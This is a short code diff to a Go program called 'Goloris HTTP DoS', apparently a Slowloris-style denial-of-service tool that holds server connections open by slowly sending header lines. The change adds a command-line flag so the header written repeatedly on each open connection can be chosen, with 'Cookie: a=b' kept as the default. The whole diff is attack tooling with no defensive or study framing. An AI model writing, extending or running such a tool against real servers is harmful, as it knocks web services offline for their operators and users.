@@ -14,6 +14,7 @@ import (
 
 const (
 	defaultUserAgent = "Goloris HTTP DoS"
+	defaultDOSHeader = "Cookie: a=b"
 )
 
 var (
@@ -25,6 +26,7 @@ var (
 	userAgent      string
 	target         string
 	https          bool
+	dosHeader      string
 )
 
 func main() {
@@ -65,6 +67,7 @@ func parseParams() {
 	flag.StringVar(&method, "method", "GET", "HTTP method to use")
 	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
 	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
+	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
 	flag.BoolVar(&https, "https", false, "Use HTTPS")
 	flag.Parse()
 }
@@ -124,7 +127,7 @@ loop:
 		for {
 			select {
 			case <-time.After(time.Duration(interval) * time.Second):
-				_, err := conn.Write([]byte("Cookie: a=b\r\n"))
+				_, err := conn.Write([]byte(dosHeader + "\r\n"))
 				if err != nil {
 					continue loop
 				}
